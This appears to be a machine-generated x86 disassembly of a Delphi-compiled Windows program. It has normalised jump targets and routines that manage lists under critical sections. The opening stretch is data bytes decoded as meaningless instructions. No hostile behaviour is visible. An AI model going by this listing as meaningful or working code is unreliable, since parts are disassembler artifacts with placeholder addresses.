xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov al 0xe1
inc ecx
add [ eax - 0x17ffbe1e ] dl
loope r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] al
inc ebp
push esp
push 0x64616572
in al 0x68
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
loop r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
clc
push 0xf0f0041
dec ecx
inc esp
jae r-xdata
add [ eax ] al
add [ eax ] al
fsubr [ eax + 0x41 ]
add [ eax + eax ] cl
add [ edx + 0x41 ] cl
add [ esi ] bh
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c0040 ] dl
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add al 0xd4
jmp r-xdata
outsb
jb r-xdata
dec esi
je r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
jmp sub_420f04
outsd
je r-xdata
je r-xdata
outsb
jb r-xdata
pop ebp
retn 0x4
inc esp
and al 0x4
aam 0xe9
mov esp [ ebp + 0x35cc0000 ]
imul eax [ ecx ] r-xdata
dec ebp
imul eax [ ecx ] r-xdata
push edi
imul eax [ ecx ] r-xdata
outsd
imul eax [ ecx ] 0x2
pop eax
sbb [ ebx + 0x59ec86e2 ] cl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push 0xc0041
rcr al 0x68
rcr al 0xe9
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82285
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
inc ebp
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
jae r-xdata
out dx eax
movsd [ edi ] [ esi ]
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
sub_4169d8
xchg esi eax
imul eax [ ecx ] 0x0
push eax
push 0x41
add ah dl
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x6a ] ah
inc ecx
add ah al
push 0x41
add [ eax ] dh
add [ eax ] al
add [ eax - 0x7bffbea4 ] ch
push cs
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
pushad
pop es
inc edx
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ah
push 0x80041
add [ eax ] al
adc [ eax ] al
std
add [ esi + ecx + 0x7140042 ] ah
inc edx
add [ esi ] cl
inc edx
sub_416a7f
push ecx
push eax
[ eax ]
or eax [ edx ]
and [ ebx ] cl
inc edx
add [ ebx + ecx ] ah
inc edx
add [ ebx + ecx ] bh
inc edx
add [ eax + 0xb ] dh
inc edx
add [ eax + 0xb ] al
inc edx
add [ eax + 0xb ] cl
inc edx
add [ ebx + ecx + 0x42 ] cl
add [ eax + 0xb ] bl
inc edx
add [ esp + ecx ] al
inc edx
add [ eax ] bl
or al 0x42
add [ esi + ecx ] dh
inc edx
add [ ebx + ecx + 0x42 ] al
add [ eax ] ch
or eax [ edx ]
adc al 0xb
inc edx
add [ esi + ecx + 0x42 ] bl
add [ edx ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1400416b ]
outsb
outsb
je r-xdata
cmovb eax [ eax ]
or [ eax ] dl
inc edx
add [ eax ] ch
cmovb eax [ eax ]
mov esp 0x1000420f
adc [ edx ] al
adc [ edx + eax * 2 + 0x61 ] dl
jae r-xdata
inc edx
add [ edi + ecx + 0x42 ] ch
add [ edi + ecx + 0x10040042 ] ah
inc edx
add al bl
add [ eax ] al
adc [ eax ] al
std
aam 0x6a
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
add al al
adc [ edx ] al
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1400416b ] ah
outsb
outsb
je r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
je r-xdata
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x408d
insb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c ] cl
inc ecx
add [ eax + 0x6c ] dl
inc ecx
add [ eax + eax ] dl
add ah dl
imul eax [ ecx ] sub_420e84
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
push 0x41
add [ ebx * 2 + 0x20041 ] bl
pop es
inc ebx
insb
popad
jae r-xdata
adc [ edx ] al
mov esp 0x8004210
adc [ edx ] eax
add [ eax ] eax
out dx eax
adc [ edx ] eax
and al 0x11
inc edx
add [ eax - 0x17ffbdf0 ] bh
add [ esi + ecx + 0x101c0042 ] ah
inc edx
add [ eax + 0x24004211 ] al
adc [ edx ] eax
mov eax 0xe8004210
inc edx
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
jae r-xdata
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
sub [ ebx + 0x41 ] 0x0
add [ eax ] al
push 0x80041
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
add al ah
sub_416cac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406088
pop edi
pop esi
pop ebx
retn
sub_416cd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40606c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406090
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416df4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418310
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034a4
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034a4
test al al
je r-xdata
sub_416e54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_416df4
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416df4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034a4
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_416ec4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4181b4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_416f40
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
mov eax [ esi + 0x4 ]
call sub_403290
mov eax [ esi + 0x8 ]
call sub_403290
mov eax [ esi + 0xc ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_416f80
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_418310
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031f4
test al al
jne r-xdata
sub_416fe0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_418310
mov edx eax
mov eax ebp
call sub_4034a4
test al al
jne r-xdata
sub_417024
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4170bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_416f80
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4181b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4170c6
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
sub_4170e4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_40522c
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417104
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418310
mov edx edi
call sub_4170e4
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418310
mov edx edi
call sub_4170e4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418200
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4170e4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418200
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4171a8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_418310
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_416fe0
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4171f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416ec4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4181b4
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_417268
push ebx
push esi
push edi
push ebp
call sub_403644
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_418310
call sub_403290
inc edi
dec ebp
jne r-xdata
sub_4172c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_418310
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_416e54
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417308
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_416f80
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_418310
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41734c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4173cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173d6
lea eax [ ebp - 0x10c ]
call sub_404008
retn
sub_4173dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4172c4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_416de8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41734c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_418310
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418310
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4034a4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4172c4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418200
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4181b4
sub_4174c8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418310
mov edx ebp
call sub_4170cc
test al al
jne r-xdata
sub_41750c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_416ec4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4181b4
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418310
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41836c
test eax eax
jge r-xdata
sub_417568
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418310
mov esi eax
mov edx ebp
mov eax esi
call sub_417104
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403290
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418200
sub_4175b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_4176b7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4176be
mov eax [ rw-data ]
call sub_41755c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4181b4
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418310
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_416fe0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4181b4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418310
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4176be
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4176e4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_417714
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4174a4
xor edx edx
push ebp
push sub_41778b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41755c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403af0
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418310
mov edx [ ebp - 0x4 ]
call sub_416f80
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4177a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417808
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41780f
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_417814
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_41785a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417308
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417861
mov eax [ rw-data ]
call sub_41755c
retn
sub_417868
push ebx
push esi
mov esi eax
mov eax esi
call sub_417814
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4177a8
sub_417888
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_4178ed
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4174c8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4174b0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178f4
mov eax [ rw-data ]
call sub_41755c
retn
mov eax ebx
call sub_40321c
mov ebx eax
sub_4178f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_41793a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417941
mov eax [ rw-data ]
call sub_41755c
retn
sub_417944
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_417986
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41750c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41798d
mov eax [ rw-data ]
call sub_41755c
retn
sub_417990
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_4179d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4173dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179de
mov eax [ rw-data ]
call sub_41755c
retn
sub_4179e4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
push ebp
push sub_417a32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4171a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a39
mov eax [ rw-data ]
call sub_41755c
retn
sub_417a98
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
